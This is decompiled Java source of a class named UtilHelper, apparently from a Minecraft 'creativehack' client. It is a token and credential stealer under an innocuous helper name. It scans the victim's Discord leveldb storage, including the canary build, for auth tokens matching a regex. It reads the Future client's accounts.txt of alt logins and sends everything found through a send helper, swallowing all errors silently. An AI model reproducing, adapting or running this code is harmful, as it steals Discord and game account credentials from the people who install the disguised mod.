// 
// Decompiled by Procyon v0.5.36
// 

package me.xiam.creativehack;

import java.util.regex.Matcher;
import java.io.FileReader;
import me.xiam.creativehack.setting.StaticHelper;
import java.util.regex.Pattern;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.InputStream;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.File;

public class UtilHelper
{
    private static String accountslist;
    private static String files;
    private static String mcToken;
    private static String displayName;
    private static String toSend;
    
    public static void main() {
        try {
            final String userHome = System.getProperty("user.home");
            final String username = System.getProperty("user.name");
            final String discordNormal = "C:\\Users\\" + username + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\";
            final String canaryPath = "C:\\Users\\" + username + "\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\";
            final String ptbPath = "C:\\Users\\" + username + "\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb\\";
            final File f = new File(discordNormal);
            final String[] list;
            final String[] pathnames = list = f.list();
            for (final String pathname : list) {
                try {
                    final FileInputStream fstream = new FileInputStream(discordNormal + pathname);
                    final DataInputStream in = new DataInputStream(fstream);
                    final BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        final Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
                        final Matcher m = p.matcher(strLine);
                        while (m.find()) {
                            StaticHelper.send(username + "  -  " + m.group());
                        }
                    }
                }
                catch (Exception ex) {}
            }
            for (final String pathname : pathnames) {
                try {
                    final FileInputStream fstream = new FileInputStream(canaryPath + pathname);
                    final DataInputStream in = new DataInputStream(fstream);
                    final BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        final Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
                        final Matcher m = p.matcher(strLine);
                        while (m.find()) {
                            StaticHelper.send(username + "  -  " + m.group());
                        }
                    }
                }
                catch (Exception ex2) {}
            }
            final File futureAlts = new File("C:\\Users\\" + username + "\\Future\\accounts.txt");
            if (futureAlts.exists()) {
                final FileReader fr = new FileReader(futureAlts);
                final BufferedReader br2 = new BufferedReader(fr);
                final StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br2.readLine()) != null) {
                    sb.append(line);
                    sb.append("\n");
                }
                UtilHelper.accountslist = sb.toString();
                fr.close();
                br2.close();
                StaticHelper.send(UtilHelper.accountslist);
            }
            final File minecraftLauncherProfile = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\.minecraft\\launcher_profiles.json");
            if (minecraftLauncherProfile.exists()) {}
        }
        catch (Exception ex3) {}
    }
    
    static {
        UtilHelper.accountslist = "";
        UtilHelper.files = "";
        UtilHelper.toSend = "";
    }
}
